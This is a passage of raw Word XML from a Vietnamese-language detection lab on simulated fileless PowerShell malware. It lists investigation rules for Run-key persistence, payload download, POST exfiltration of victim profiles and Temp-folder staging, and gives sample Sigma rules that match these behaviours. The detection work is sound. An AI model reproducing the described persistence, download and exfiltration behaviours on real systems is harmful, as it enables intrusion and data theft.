        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Có PowerShell script execution</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Không có payload file trên disk</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  = nghi vấn in-memory fileless execution</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Đây là điểm khác biệt quan trọng so với lab cũ có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.6. Rule 6 - Registry Run key tạo persistence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu Registry Run key tạo value mới gọi powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lý do:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Run key là cơ chế autostart hợp pháp.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Malware có thể lạm dụng để duy trì khả năng chạy lại sau khi user đăng nhập.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Lab dùng value dễ nhận biết và có cleanup rõ ràng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.7. Rule 7 - PowerShell gửi dữ liệu ra ngoài</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu powershell.exe vừa tải payload vừa gửi POST về cùng một host</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>GET /payload.ps1   trên port 8000</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /collect      trên port 8001</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là mô phỏng an toàn của hành vi gửi thông tin máy nạn nhân về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3.8. Rule 8 - Offline staging trong thư mục Temp</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý tưởng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Nếu process PowerShell tạo file JSON trong %TEMP%\FilelessLab\queue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>thì cần điều tra.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là mô phỏng hành vi cache/staging dữ liệu khi chưa thể gửi ra ngoài.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sysmon Event ID 11 có thể ghi nhận file create.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Khi mạng quay lại, payload gửi queue về attacker rồi xóa file đã gửi thành công.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4. Sigma rule mẫu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.1. Explorer Spawn PowerShell With Web Download</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>title: Explorer Spawns PowerShell With Web Download</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id: fileless-lab-explorer-powershell-web-download</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>status: experimental</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>description: Detects PowerShell spawned from Explorer with web download indicators, suitable for LNK launcher behavior.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>logsource:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  product: windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  category: process_creation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>detection:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_parent:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    ParentImage|endswith: '\explorer.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_img:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Image|endswith:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\powershell.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\pwsh.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_cli:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    CommandLine|contains:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'Invoke-RestMethod'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'Invoke-WebRequest'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'http://'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'https://'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  condition: selection_parent and selection_img and selection_cli</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>falsepositives:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Helpdesk scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Internal automation launched by users</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>level: medium</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.2. PowerShell ScriptBlock Create From Command Line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>title: PowerShell ScriptBlock Create From Command Line</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id: fileless-lab-powershell-scriptblock-create</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>status: experimental</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>description: Detects PowerShell creating ScriptBlock objects from command line content.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>logsource:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  product: windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  category: process_creation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>detection:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_img:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Image|endswith:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\powershell.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\pwsh.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection_cli:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    CommandLine|contains:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'ScriptBlock'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - 'Create'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  condition: selection_img and selection_cli</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>falsepositives:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Advanced administration scripts</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Development testing</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>level: medium</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4.3. PowerShell Network Connection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>title: PowerShell Network Connection To Unusual Destination</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>id: fileless-lab-powershell-network-connection</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>status: experimental</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>description: Detects PowerShell creating a network connection to an unusual destination.</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>logsource:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  product: windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  category: network_connection</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>detection:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  selection:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Image|endswith:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\powershell.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      - '\pwsh.exe'</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  condition: selection</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>falsepositives:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
